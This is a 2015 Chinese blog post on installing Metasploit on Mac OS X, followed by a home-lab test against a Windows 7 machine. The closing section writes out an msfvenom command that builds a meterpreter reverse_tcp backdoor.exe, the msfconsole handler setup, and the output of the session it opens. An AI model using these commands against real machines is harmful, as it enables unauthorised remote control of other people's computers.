---
layout:     post
title:      Metasploit折腾小记
date:       2015-11-08 11:40:25
author:     Hsmouc
summary:    Metasploit在Mac OS上的安装和基础使用    
categories: Hacking
thumbnail:  heart
tags:
 - 欢迎来我的博客
---
- 还是写在文前：怎么说呢，折腾这个东西我的内心是很复杂的。一个美好的用来写模电和概率和大物的周日就这么没了ˊ_>ˋ哎呀，可是人家就是这么执着的跳坑怎么破。还是和以往一样，这篇文章的相关技术仅供学习，千万不要做出一些危险出格的事情。

###Metasploit的安装
这一部分真的是让我的心都碎了，也是最难折腾的。在YouTube上面找了好多视频，永远都是人家一路回车，我一路报错，果然是人品用完的节奏。闲话少说，开始安装，我的系统是Mac OS X 10.10.5，一般大家都是用BT5干这种活啦。

1. 从Github上克隆Metasploit项目    
选一个合适的目录，然后在终端里面输入:
{% highlight c %}
git clone git@github.com:rapid7/metasploit-framework.git
{% endhighlight %}
之后把终端cd到你刚才选择的目录，输入:
{% highlight c %}
msfconsole
{% endhighlight %}
报错就对了，因为你没有装蛋疼的依赖环境。
2. 安装依赖环境  
2.1 *Ruby*  
因为我是Mac系统又安装了Xcode，所以已经有了Ruby 1.8的环境，但是后续安装会要求更高的版本，所以我们先更新一下Ruby，推荐使用rvm，具体参见[脉脉不得语的技术博客](http://www.inferjay.com/blog/2013/05/09/how-to-install-ruby-1-dot-9-3-in-mac-osx/)  
2.2 *Homebrew*   
这玩意是个OS X的软件管理器，相当好用，我们使用Ruby命令来安装它，下面的安装会用到。
{% highlight ruby %}
ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
{% endhighlight %}
我们作死运行下Metasploit，发现还是报错，具体报什么错我也忘记了（哭）。     
2.3 *Nmap*   
强大的嗅探器，使用我们刚刚装好的homebrew安装：
{% highlight c %}
brew install nmap
{% endhighlight %}    
2.4 *bundler*  
就是这货坑死人不偿命，按照教程来说，只需要简单的一句指令：
{% highlight c %}
gem install bundler
{% endhighlight %}
我猜你们一定会在安装到nokogiri的时候报错，事实就是这玩意需要自己手动安装，报错提示libiconv is missing，解决方案：
{% highlight c %}
brew update
xcode-select --install
brew link libiconv--force
gem install nokogiri -- --with-iconv-dir=/usr/local/Cellar/libiconv/1.14
{% endhighlight %}
再次使用gem install bundler
3. 安装postgresql并配置。   
这个我不会-_-#，因为我发现不配置数据库的话Metasploit已经可以使用了，不用数据库的视频教程见[YouTube](https://www.youtube.com/watch?v=C2CEQupM2PM).我基本上是按照他的顺序安装的。   
关于配置数据库的教程：[RickGrey](http://www.freebuf.com/articles/system/36924.html)(中文教程)、[Darkoperator](http://www.darkoperator.com/installing-metasploit-framewor/)(英文教程)。  
其他的相关问题可以在官方的论坛[RAPID7COMMUNITY](https://community.rapid7.com/community/metasploit)上交流。   

###一次简单的内网渗透
- 工具：Mac OS X with Metasploit(Attacker)  Windows 7(Victim)
- 原理：通过msfpayload生成后门exe然后上传到目标机器上执行，通过本地监听获得meterpreter shell，并得到shell
####生成一个backdoor.exe
Windows:
{% highlight c %}
sudo ./msfvenom windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> X > backdoor.exe
{% endhighlight %}
几点说明：如果被攻击的计算机和你在同一局域网下，可以使用LAN IP，用ifconfig即可，如果是WAN攻击则使用WAN IP即可。     
如果运行sudo ./msfvenom终端提示你安装bundler，自求多福吧，我也不知道怎么解决的。耗了一下午反复装了无数遍最后居然莫名其妙的好了。  
这里使用的msfvenom是因为软件更新，原先的msfpayload功能已经集成在了msfvenom里了。
####上传backdoor.exe并获得shell
直接上指令：  
{% highlight c %}
$ msfconsole
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.3
LHOST => 192.168.1.3
msf exploit(handler) > set LPORT 4444
LPORT => 4444
msf exploit(handler) > exploit
{% endhighlight %}
在Victim的计算机上双击backdoor.exe，顺利的话会这样：
{% highlight c %}
[*] Started reverse handler on 192.168.1.3:4444
[*] Starting the payload handler...
[*] Sending stage (957486 bytes) to 192.168.1.3
[*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.3:54411) at 2015-11-08 22:07:07 +0800
{% endhighlight %}
然后输入shell尽情玩耍吧……   
附上一张截图：
![](http://ww4.sinaimg.cn/mw690/005WMcFzjw1exupqph2nvj313w0bxack.jpg)
由图可见我完全接管了Windows 7的shell，下面就可以随心所欲了23333
###小结
对于linux来说，遇到错误真的就是Google，复制命令然后祈祷了。装什么东西都要搞一大堆依赖包，不过总体来说还是比较人性化，大多数时候终端会告诉你你需要装什么。Metasploit功能强大，最近在测试的只是基于LAN下的计算机，更深入的问题留作以后探讨。     
最后用BackTrack Linux上的一句话来作结：
>The quieter you become,the more you are able to hear...